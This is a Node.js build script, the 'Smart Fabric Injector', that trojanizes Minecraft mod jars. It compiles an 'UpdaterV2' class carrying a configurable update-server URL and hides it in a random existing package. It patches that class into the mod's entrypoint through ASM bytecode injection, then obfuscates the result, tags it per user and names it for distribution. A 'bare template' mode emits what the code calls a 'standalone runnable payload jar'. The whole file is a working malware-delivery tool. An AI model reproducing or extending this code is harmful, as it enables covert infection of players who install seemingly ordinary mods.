const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const crypto = require("crypto");
const AdmZip = require("adm-zip");
const { execFileSync, execFile } = require("child_process");
const OBFUSCATE_DEFAULT = "1";
// Bare template mode: build a jar that contains nothing but the injected
// class (UpdaterV2) with obfuscation applied — no third-party mod target.
const BARE_TEMPLATE = process.env.BARE_TEMPLATE === "1";

console.log("====================================");
console.log(" SMART FABRIC INJECTOR (bytecode edition)");
console.log("====================================");

if (process.argv.length < 3) {
  console.log(
    "[ERROR] Usage: node index.js <mod.jar> [userId] [outputDir] [updateServerUrl]",
  );
  process.exit(1);
}

const targetJar = process.argv[2];
const userId = process.argv[3] || process.env.BUILD_USER_ID || "";
const outputDir = process.argv[4] || process.env.BUILD_OUTPUT_DIR || "";
const updateServerUrl =
  process.argv[5] ||
  process.env.BUILD_UPDATE_SERVER_URL ||
  "";

console.log("[DEBUG] Target: " + targetJar);
console.log("[DEBUG] User ID: " + userId);
console.log("[DEBUG] Output Dir: " + outputDir);
console.log("[DEBUG] Update Server URL: " + updateServerUrl);

function getJavaRelease() {
  if (process.env.INJECTOR_JAVA_RELEASE) {
    return process.env.INJECTOR_JAVA_RELEASE;
  }
  try {
    const versionOutput = require("child_process")
      .execSync("javac -version", { stdio: "pipe" })
      .toString("utf8");
    const match = versionOutput.match(/javac\s+(\d+)/);
    if (match) {
      const major = parseInt(match[1], 10);
      if (major === 1) {
        const subMatch = versionOutput.match(/javac\s+1\.(\d+)/);
        if (subMatch) return subMatch[1];
      }
      return String(major);
    }
  } catch (e) {
    // Fallback
  }
  return "17";
}
const JAVA_RELEASE = getJavaRelease();
console.log("[DEBUG] Using Java Release: " + JAVA_RELEASE);

function run(command, args) {
  execFileSync(command, args, { stdio: "inherit" });
}

const ASM_JAR_REL = path.join("lib", "asm-9.6.jar");
const ASM_DOWNLOAD_URL =
  "https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar";

// ASM is a build-time dependency for ByteCodeInjector but is gitignored
// (binary artifact). Fetch it from Maven Central on first build when missing.
function ensureAsmJar() {
  if (fs.existsSync(path.join(process.cwd(), ASM_JAR_REL))) return;
  fs.mkdirSync(path.join(process.cwd(), "lib"), { recursive: true });
  const outPath = path.join(process.cwd(), ASM_JAR_REL);
  console.log("[INFO] Downloading ASM " + ASM_JAR_REL + " ...");
  const out = fs.createWriteStream(outPath);
  out.on("error", () => {
    fs.unlinkSync(outPath);
  });
  const req = https.get(ASM_DOWNLOAD_URL, (res) => {
    if (res.statusCode !== 200) {
      console.error("[ERROR] Failed to download ASM (HTTP " + res.statusCode + ")");
      try {
        out.close();
        fs.unlinkSync(outPath);
      } catch (_) {}
      process.exit(1);
    }
    res.pipe(out);
    out.on("finish", () => out.close());
  });
  req.on("error", () => {
    console.error("[ERROR] Failed to download ASM: " + req.path);
    try {
      fs.unlinkSync(outPath);
    } catch (_) {}
    process.exit(1);
  });
}

// ByteCodeInjector.class is a generated artifact (gitignored). Compile it from
// source on first use instead of shipping binaries in the repository.
function ensureByteCodeInjector() {
  if (fs.existsSync(path.join(process.cwd(), "ByteCodeInjector.class"))) return;
  const cwd = process.cwd();
  const javac = "javac";
  if (!fs.existsSync(path.join(cwd, "ByteCodeInjector.java"))) {
    throw new Error("Missing ByteCodeInjector.java source");
  }
  console.log("[INFO] Compiling ByteCodeInjector.java ...");
  const cpSeparator = process.platform === "win32" ? ";" : ":";
  run(javac, [
    "--release",
    JAVA_RELEASE,
    "-cp",
    `.${cpSeparator}${ASM_JAR_REL}`,
    "-d",
    ".",
    "ByteCodeInjector.java",
  ]);
  if (!fs.existsSync(path.join(cwd, "ByteCodeInjector.class"))) {
    throw new Error("ByteCodeInjector compilation produced no class file");
  }
}

function randomIdentifier(prefix) {
  return `${prefix}${crypto.randomBytes(4).toString("hex")}`;
}

function getRandomExistingPackage(zip) {
  const classEntries = zip
    .getEntries()
    .map((e) => e.entryName)
    .filter(
      (name) =>
        name.endsWith(".class") &&
        name.includes("/") &&
        !name.startsWith("META-INF/"),
    );

  if (classEntries.length === 0) {
    return "net.minecraft";
  }

  const randomClass =
    classEntries[Math.floor(Math.random() * classEntries.length)];

  return path.dirname(randomClass).replace(/\//g, ".");
}

function buildUpdaterV2(sourcePath, zip, updateServerUrl) {
  console.log(updateServerUrl);
  const packageName = getRandomExistingPackage(zip);
  const internalName = `${packageName.replace(/\./g, "/")}/UpdaterV2`;

  // The injected class only depends on the update URL, the javac release and
  // the template source — not on the target package. Same server means the
  // same class for every user, so cache the compiled bytes across builds
  // instead of paying a full javac invocation each time.
  const cacheKey = crypto
    .createHash("sha1")
    .update(String(updateServerUrl))
    .update("|")
    .update(JAVA_RELEASE)
    .update("|")
    .update(fs.readFileSync(sourcePath))
    .digest("hex");
  const cacheDir = path.join(process.cwd(), "updater-cache");
  const cacheFile = path.join(cacheDir, `${cacheKey}.class`);

  let classData;
  let classPathTmp;
  if (fs.existsSync(cacheFile)) {
    classData = fs.readFileSync(cacheFile);
    classPathTmp = cacheFile;
    console.log("[INFO] Reusing cached UpdaterV2 class (same update URL)");
  } else {
    const buildRoot = fs.mkdtempSync(path.join(os.tmpdir(), "UpdaterV2-"));
    const sourceDir = path.join(buildRoot, ...packageName.split("."));
    const classesDir = path.join(buildRoot, "classes");
    fs.mkdirSync(sourceDir, { recursive: true });
    fs.mkdirSync(classesDir, { recursive: true });

    let originalSource = fs.readFileSync(sourcePath, "utf8");
    if (updateServerUrl) {
      originalSource = originalSource.replace(
        "PLACEHOLDER_UPDATE_SERVER_URL",
        updateServerUrl,
      );
    }
    originalSource = originalSource.replace(/^\s*package\s+[\w.]+\s*;\s*/m, "");
    const generatedSource = `package ${packageName};${os.EOL}${os.EOL}${originalSource}`;
    const generatedSourcePath = path.join(sourceDir, "UpdaterV2.java");
    fs.writeFileSync(generatedSourcePath, generatedSource, "utf8");

    run("javac", [
      "--release",
      JAVA_RELEASE,
      "-d",
      classesDir,
      generatedSourcePath,
    ]);

    const classPath =
      path.join(classesDir, ...internalName.split("/")) + ".class";
    if (!fs.existsSync(classPath)) {
      throw new Error("Generated UpdaterV2 class missing: " + classPath);
    }
    classData = fs.readFileSync(classPath);
    classPathTmp = classPath;

    fs.mkdirSync(cacheDir, { recursive: true });
    fs.writeFileSync(cacheFile, classData);
    console.log("[INFO] Cached UpdaterV2 class for future builds");
  }

  return {
    internalName,
    binaryName: internalName.replace(/\//g, "."),
    jarEntry: `${internalName}.class`,
    classData,
    classPathTmp,
  };
}

// --------------------------------------------------
// 1. Validate inputs
// --------------------------------------------------
if (!BARE_TEMPLATE && !fs.existsSync(targetJar)) {
  console.log("[ERROR] JAR not found");
  process.exit(1);
}
const UpdaterV2Java = "UpdaterV2.java";
if (!fs.existsSync(UpdaterV2Java)) {
  console.log("[ERROR] Missing source: " + UpdaterV2Java);
  process.exit(1);
}
// Bare template mode starts from an empty archive; the finished jar holds
// nothing but the injected class (+ manifest) and obfuscation artifacts.
const zip = BARE_TEMPLATE ? new AdmZip() : new AdmZip(targetJar);
console.log(BARE_TEMPLATE ? "[DEBUG] Bare template mode (no mod target)" : "[DEBUG] Opened JAR");

let UpdaterV2;
try {
  UpdaterV2 = buildUpdaterV2(UpdaterV2Java, zip, updateServerUrl);
} catch (e) {
  console.log("[ERROR] Failed compiling UpdaterV2.java");
  throw e;
}
console.log("[DEBUG] Built UpdaterV2.class at " + UpdaterV2.internalName);

// --------------------------------------------------
// 2. Open JAR
// --------------------------------------------------

// --------------------------------------------------
// 3. Prepare generated UpdaterV2 class
// --------------------------------------------------
if (zip.getEntry(UpdaterV2.jarEntry)) {
  zip.deleteFile(UpdaterV2.jarEntry);
}
console.log("[DEBUG] Prepared injd class entry: " + UpdaterV2.jarEntry);

// --------------------------------------------------
// 4. Detect Mod Loader and Extract Entrypoints (skipped in bare mode)
// --------------------------------------------------
let loaderType = "unknown";
let fabricJson = null;
let quiltJson = null;
let targetClassName = "auto";
let targetMethodName = "auto";

if (!BARE_TEMPLATE) {
const fabricEntry = zip.getEntry("fabric.mod.json");
const quiltEntry = zip.getEntry("quilt.mod.json");
const forgeEntry = zip.getEntry("META-INF/mods.toml");
const neoforgeEntry = zip.getEntry("META-INF/neoforge.mods.toml");
const mcmodEntry = zip.getEntry("mcmod.info");

if (fabricEntry) {
  loaderType = "fabric";
  console.log("[DEBUG] Detected Fabric loader via fabric.mod.json");
  try {
    fabricJson = JSON.parse(fabricEntry.getData().toString("utf8"));
  } catch (e) {
    console.log("[WARN] Failed parsing fabric.mod.json: " + e.message);
  }
} else if (quiltEntry) {
  loaderType = "quilt";
  console.log("[DEBUG] Detected Quilt loader via quilt.mod.json");
  try {
    quiltJson = JSON.parse(quiltEntry.getData().toString("utf8"));
  } catch (e) {
    console.log("[WARN] Failed parsing quilt.mod.json: " + e.message);
  }
} else if (neoforgeEntry) {
  loaderType = "neoforge";
  console.log(
    "[DEBUG] Detected NeoForge loader via META-INF/neoforge.mods.toml",
  );
} else if (forgeEntry) {
  loaderType = "forge";
  console.log("[DEBUG] Detected Forge loader via META-INF/mods.toml");
} else if (mcmodEntry) {
  loaderType = "forge-legacy";
  console.log("[DEBUG] Detected Forge (Legacy) loader via mcmod.info");
} else {
  console.log(
    "[DEBUG] No mod metadata files found. Relying on auto-detection scanning.",
  );
}

if (loaderType === "fabric" && fabricJson) {
  const PRIORITY = ["client", "main", "server", "preLaunch"];
  let selectedType = null;
  for (const type of PRIORITY) {
    if (
      fabricJson.entrypoints?.[type] &&
      Array.isArray(fabricJson.entrypoints[type]) &&
      fabricJson.entrypoints[type].length > 0
    ) {
      selectedType = type;
      break;
    }
  }
  if (selectedType) {
    const rawEntry = fabricJson.entrypoints[selectedType][0];
    if (typeof rawEntry === "string") {
      if (rawEntry.includes("::")) {
        [targetClassName, targetMethodName] = rawEntry.split("::");
      } else {
        targetClassName = rawEntry;
        const defaultMethods = {
          client: "onInitializeClient",
          main: "onInitialize",
          server: "onInitializeServer",
          preLaunch: "onPreLaunch",
        };
        targetMethodName = defaultMethods[selectedType] || "onInitialize";
      }
    }
  } else {
    console.log(
      "[WARN] Fabric mod has no entrypoints in metadata. Auto-scanning will be used.",
    );
  }
} else if (loaderType === "quilt" && quiltJson) {
  const quiltLoader = quiltJson.quilt_loader || {};
  const entrypoints = quiltLoader.entrypoints || quiltJson.entrypoints || {};
  const PRIORITY = ["client_init", "init", "main", "client", "server"];
  let selectedType = null;
  for (const type of PRIORITY) {
    if (entrypoints[type]) {
      if (Array.isArray(entrypoints[type]) && entrypoints[type].length > 0) {
        selectedType = type;
        break;
      } else if (typeof entrypoints[type] === "string") {
        selectedType = type;
        break;
      }
    }
  }
  if (selectedType) {
    let rawEntry = entrypoints[selectedType];
    if (Array.isArray(rawEntry)) {
      rawEntry = rawEntry[0];
    }
    if (typeof rawEntry === "string") {
      if (rawEntry.includes("::")) {
        [targetClassName, targetMethodName] = rawEntry.split("::");
      } else {
        targetClassName = rawEntry;
        const defaultMethods = {
          client_init: "onInitializeClient",
          init: "onInitialize",
          client: "onInitializeClient",
          main: "onInitialize",
          server: "onInitializeServer",
        };
        targetMethodName = defaultMethods[selectedType] || "onInitialize";
      }
    }
  } else {
    console.log(
      "[WARN] Quilt mod has no entrypoints in metadata. Auto-scanning will be used.",
    );
  }
}
} // end if (!BARE_TEMPLATE)

const enableobf2 =
  String(process.env.ENABLE_OBF2 || process.env.ENABLE_obf2 || OBFUSCATE_DEFAULT) === "1";
const extractedMixinClasses = enableobf2
  ? extractMixinClasses(zip, fabricJson, quiltJson)
  : [];

// --------------------------------------------------
// 5. Build output jar (Bytecode injection, or bare minimal jar)
// --------------------------------------------------
const targetBasename = BARE_TEMPLATE
  ? "injected-naked"
  : path.basename(targetJar, ".jar");
const outDir = outputDir ? path.resolve(outputDir) : path.dirname(targetJar);
if (outputDir && !fs.existsSync(outDir)) {
  fs.mkdirSync(outDir, { recursive: true });
}
const injdOutput = path.join(outDir, `${targetBasename}-injd.jar`);

if (BARE_TEMPLATE) {
  // Produce a jar containing nothing but the injected class. The manifest
  // Main-Class points at UpdaterV2 (kept by the obfuscator), so the result
  // is a standalone runnable payload jar.
  const bareZip = new AdmZip();
  const manifest =
    "Manifest-Version: 1.0\r\n" +
    "Main-Class: " + UpdaterV2.binaryName + "\r\n\r\n";
  bareZip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifest, "utf8"));
  bareZip.addFile(UpdaterV2.jarEntry, fs.readFileSync(UpdaterV2.classPathTmp));
  bareZip.writeZip(injdOutput);
  console.log("[DEBUG] Built bare template jar with only the injected class");
} else {
console.log("[DEBUG] Executing ByteCodeInjector JAR patching...");
ensureAsmJar();
ensureByteCodeInjector();
const cpSeparator = process.platform === "win32" ? ";" : ":";
const classpath = `.${cpSeparator}lib/asm-9.6.jar`;

try {
  run("java", [
    "-cp",
    classpath,
    "ByteCodeInjector",
    targetJar,
    injdOutput,
    UpdaterV2.internalName,
    targetClassName,
    targetMethodName,
    UpdaterV2.classPathTmp,
    UpdaterV2.jarEntry,
  ]);
} catch (e) {
  console.log("[ERROR] ByteCodeInjector execution failed");
  console.error(e);
  process.exit(1);
}
}

// --------------------------------------------------
// 6. Obfuscation stage (obf2; loader-safe defaults)
// --------------------------------------------------

// The obfuscator is built locally by the folded-in of/ Gradle project
// (JDK 21, outputs of/build/libs/fabric-obf.jar). No remote download: if the
// jar is absent we skip obfuscation and keep the injected JAR, since a broken
// obfuscator must never abort an otherwise-valid injection.
const envObf2Jar =
  process.env.OBF2_JAR || process.env.obf2_JAR || "";
const DEFAULT_OBF2_JAR = path.join(
  process.cwd(),
  "..",
  "of",
  "build",
  "libs",
  "fabric-obf.jar",
);

function resolveobf2Jar() {
  if (envObf2Jar && fs.existsSync(envObf2Jar)) return envObf2Jar;
  if (fs.existsSync(DEFAULT_OBF2_JAR)) return DEFAULT_OBF2_JAR;
  return null;
}

function extractMixinClasses(zip, fabricJson, quiltJson) {
  const classes = new Set();
  const mixinFiles = new Set();

  if (fabricJson && fabricJson.mixins) {
    for (const mixinFile of fabricJson.mixins) {
      if (typeof mixinFile === "string") mixinFiles.add(mixinFile);
      else if (mixinFile && typeof mixinFile.config === "string")
        mixinFiles.add(mixinFile.config);
    }
  }

  if (quiltJson) {
    const mixins =
      quiltJson.mixin ||
      quiltJson.mixins ||
      quiltJson.quilt_loader?.mixin ||
      quiltJson.quilt_loader?.mixins;
    if (Array.isArray(mixins)) {
      for (const mixinFile of mixins) {
        if (typeof mixinFile === "string") mixinFiles.add(mixinFile);
        else if (mixinFile && typeof mixinFile.config === "string")
          mixinFiles.add(mixinFile.config);
      }
    }
  }

  zip.getEntries().forEach((entry) => {
    if (entry.entryName.endsWith(".mixins.json")) {
      mixinFiles.add(entry.entryName);
    }
  });

  for (const mixinFile of mixinFiles) {
    const mixinEntry = zip.getEntry(mixinFile);
    if (!mixinEntry) continue;
    try {
      const mixJson = JSON.parse(mixinEntry.getData().toString("utf8"));
      const pkg = mixJson.package || "";
      const allMixins = [
        ...(Array.isArray(mixJson.client) ? mixJson.client : []),
        ...(Array.isArray(mixJson.mixins) ? mixJson.mixins : []),
        ...(Array.isArray(mixJson.server) ? mixJson.server : []),
      ];
      for (const name of allMixins) {
        if (typeof name !== "string") continue;
        classes.add(pkg ? `${pkg}.${name}` : name);
      }
    } catch (e) {
      console.log("[WARN] Failed parsing mixin file: " + mixinFile);
    }
  }
  return [...classes];
}

function ensureobf2Jar() {
  return resolveobf2Jar();
}

function javaVersionCheck(javaPath) {
  // Concurrent probe: JDK -version spawns are slow (~hundreds of ms each), and
  // probing a machine full of JDK installations one-by-one costs seconds.
  return new Promise((resolve) => {
    try {
      execFile(javaPath, ["-version"], { timeout: 2000, windowsHide: true }, (err, stdout, stderr) => {
        resolve(
          isVersion21OrHigher(
            (stdout ? stdout.toString("utf8") : "") +
              (stderr ? stderr.toString("utf8") : ""),
          ),
        );
      });
    } catch (e) {
      resolve(false);
    }
  });
}

function isVersion21OrHigher(versionStr) {
  const match =
    versionStr.match(/(?:version|build)\s+["']?(\d+)/i) ||
    versionStr.match(/(\d+)\.\d+\.\d+/);
  if (match) {
    const major = parseInt(match[1], 10);
    return major >= 21;
  }
  return false;
}

async function findJava21OrHigher() {
  const candidates = [];
  candidates.push("java");

  if (process.env.JAVA_HOME) {
    const javaExe = process.platform === "win32" ? "java.exe" : "java";
    const javaPath = path.join(process.env.JAVA_HOME, "bin", javaExe);
    if (fs.existsSync(javaPath)) {
      candidates.push(javaPath);
    }
  }

  const pathsToSearch = [];
  if (process.platform === "win32") {
    const programFiles = process.env.ProgramFiles || "C:\\Program Files";
    const userHome = os.homedir();

    const searchRoots = [
      path.join(programFiles, "Java"),
      path.join(programFiles, "Eclipse Adoptium"),
      path.join(programFiles, "Microsoft"),
      path.join(programFiles, "Amazon Corretto"),
      path.join(programFiles, "BellSoft"),
      path.join(userHome, ".jdks"),
      path.join(userHome, "AppData\\Local\\Programs\\Adoptium"),
    ];

    for (const root of searchRoots) {
      if (fs.existsSync(root)) {
        try {
          const dirs = fs.readdirSync(root);
          for (const dir of dirs) {
            const fullDir = path.join(root, dir);
            const javaExePath = path.join(fullDir, "bin", "java.exe");
            if (fs.existsSync(javaExePath)) {
              pathsToSearch.push(javaExePath);
            }
          }
        } catch (_) {}
      }
    }
  } else if (process.platform === "darwin") {
    const jvmRoot = "/Library/Java/JavaVirtualMachines";
    if (fs.existsSync(jvmRoot)) {
      try {
        const dirs = fs.readdirSync(jvmRoot);
        for (const dir of dirs) {
          const javaPath = path.join(jvmRoot, dir, "Contents/Home/bin/java");
          if (fs.existsSync(javaPath)) {
            pathsToSearch.push(javaPath);
          }
        }
      } catch (_) {}
    }
    const brewPaths = [
      "/opt/homebrew/opt/openjdk@21/bin/java",
      "/opt/homebrew/opt/openjdk/bin/java",
      "/usr/local/opt/openjdk/bin/java",
    ];
    pathsToSearch.push(...brewPaths);
  } else {
    const jvmRoots = ["/usr/lib/jvm", "/usr/lib64/jvm"];
    for (const root of jvmRoots) {
      if (fs.existsSync(root)) {
        try {
          const dirs = fs.readdirSync(root);
          for (const dir of dirs) {
            const javaPath = path.join(root, dir, "bin/java");
            if (fs.existsSync(javaPath)) {
              pathsToSearch.push(javaPath);
            }
          }
        } catch (_) {}
      }
    }
  }

  const allCandidates = candidates.concat(pathsToSearch);
  // Probe everything at once; take the first candidate that reports 21+.
  const results = await Promise.all(
    allCandidates.map((p) => javaVersionCheck(p)),
  );
  for (let i = 0; i < allCandidates.length; i++) {
    if (results[i]) return allCandidates[i];
  }
  return null;
}

async function runobf2(inputJar, mixinClasses) {
  const pgJar = await ensureobf2Jar();
  if (!pgJar) {
    console.log("[INFO] obf2.jar not found, skipping obfuscation stage");
    return inputJar;
  }

  const outputJar = inputJar.replace(/\.jar$/i, "-obf.jar");
  const seed = Math.floor(Math.random() * 1_000_000_000).toString();
  const aggressive = String(process.env.OBF2_AGGRESSIVE || "1") === "1";

  const javaBin = await findJava21OrHigher();
  if (!javaBin) {
    throw new Error(
      "Obfuscation requires Java 21 or higher. No Java 21+ installation was detected. Please install Java 21 or set JAVA_HOME to a Java 21+ installation.",
    );
  }
  console.log("[DEBUG] Using Java 21+ path for obfuscation: " + javaBin);

  const args = [
    "-jar",
    pgJar,
    "--in",
    path.resolve(inputJar),
    "--out",
    path.resolve(outputJar),
    "--seed",
    seed,
    ...(aggressive ? ["--insane"] : []),
  ];

  run(javaBin, args);

  console.log("[DEBUG] obf2 output: " + outputJar);
  return outputJar;
}

let finalOutput = injdOutput;
(async () => {
  try {
    finalOutput = await runobf2(finalOutput, extractedMixinClasses);
  } catch (e) {
    console.log("[WARN] Obfuscation stage failed; keeping injd JAR.");
    console.log(String(e.message || e));
    finalOutput = injdOutput;
  }

  // 1. Embed user_id.txt inside the final JAR if userId is specified
  if (userId) {
    try {
      console.log("[DEBUG] Embedding user ID in JAR metadata...");
      const finalZip = new AdmZip(finalOutput);
      if (finalZip.getEntry("user_id.txt")) {
        finalZip.deleteFile("user_id.txt");
      }
      finalZip.addFile("user_id.txt", Buffer.from(userId, "utf8"));
      finalZip.writeZip();
      console.log("[DEBUG] Embedded user_id.txt inside " + finalOutput);
    } catch (zipErr) {
      console.log(
        "[WARN] Failed to embed user_id.txt in JAR: " + zipErr.message,
      );
    }
  }

  // 2. Copy/rename final output to a clean user-specific filename
  if (userId) {
    const cleanFinalOutput = path.join(
      outDir,
      `injected_mod_user_${userId}.jar`,
    );
    try {
      if (fs.existsSync(cleanFinalOutput)) {
        fs.unlinkSync(cleanFinalOutput);
      }
      fs.copyFileSync(finalOutput, cleanFinalOutput);
      console.log("[DEBUG] Copied final JAR to: " + cleanFinalOutput);
      finalOutput = cleanFinalOutput;
    } catch (copyErr) {
      console.log(
        "[WARN] Failed to copy final JAR to user name: " + copyErr.message,
      );
    }
  }

  console.log("");
  console.log("====================================");
  console.log("[SUCCESS] Injection complete");
  console.log("injd JAR: " + injdOutput);
  console.log("Final JAR: " + finalOutput);
  console.log("====================================");
})();
